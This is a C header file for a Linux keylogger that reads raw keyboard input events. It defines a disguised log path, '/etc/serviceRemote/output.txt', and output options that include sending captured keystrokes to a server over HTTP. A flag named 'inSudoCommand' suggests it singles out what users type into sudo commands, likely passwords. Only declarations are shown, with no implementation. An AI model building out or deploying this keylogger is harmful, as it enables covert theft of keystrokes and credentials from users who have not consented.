#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>

#define FILE_OUTPUT "/etc/serviceRemote/output.txt"
#define BUFFER_SIZE 1024

#define DEBUG_MODE 0

/**
 * @OUT_PUT_METHOD
 *
 * 0 - Print in terminal
 * 1 - Print in file
 * 2 - Send to server (HTTP)
*/
#define OUT_PUT_METHOD 1

typedef struct 
{
  short unsigned int  inCapsLock ;
  short unsigned int  inShift;
  short unsigned int inSudoCommand;
  short unsigned int listen;

  char *currentWord;

  struct input_event ev;
} KeyLogger;

KeyLogger *CreateKeyLogger();
void MountWord(KeyLogger *keyLogger);
void AnalyzeWord(KeyLogger *keyLogger);
void StartKeyLogger(KeyLogger *keyLogger);
void DestroyKeyLogger(KeyLogger *keyLogger);

#endif